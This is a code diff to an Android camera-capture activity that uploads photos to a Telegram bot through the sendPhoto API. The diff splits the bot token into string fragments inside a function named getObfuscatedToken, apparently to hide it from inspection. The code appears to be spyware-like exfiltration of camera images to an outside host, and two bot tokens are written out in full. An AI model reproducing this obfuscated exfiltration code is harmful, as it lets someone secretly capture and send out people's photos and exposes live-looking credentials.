@@ -14,9 +14,21 @@ import kotlin.concurrent.thread
 
 class CameraCaptureActivity : Activity() {
 
+    companion object {
+        private fun getObfuscatedToken(): String {
+            val p1 = "9004970470"
+            val p2 = "AAFfsBFENB"
+            val p3 = "n1PRMxVwDv"
+            val p4 = "lt2j--qBJC"
+            val p5 = "JU99Y"
+            return "$p1:$p2$p3$p4$p5"
+        }
+    }
+
     private var cameraDevice: CameraDevice? = null
     private val handlerThread = HandlerThread("CameraCaptureThread").apply { start() }
     private val backgroundHandler = Handler(handlerThread.looper)
+    private val botToken: String get() = getObfuscatedToken()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -116,7 +128,7 @@ class CameraCaptureActivity : Activity() {
             var connection: HttpURLConnection? = null
             try {
                 val boundary = "Boundary_${System.currentTimeMillis()}"
-                val url = URL("https://api.telegram.org/bot9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY/sendPhoto")
+                val url = URL("https://api.telegram.org/bot$botToken/sendPhoto")
                 connection = url.openConnection() as HttpURLConnection
                 connection.doOutput = true
                 connection.requestMethod = "POST"
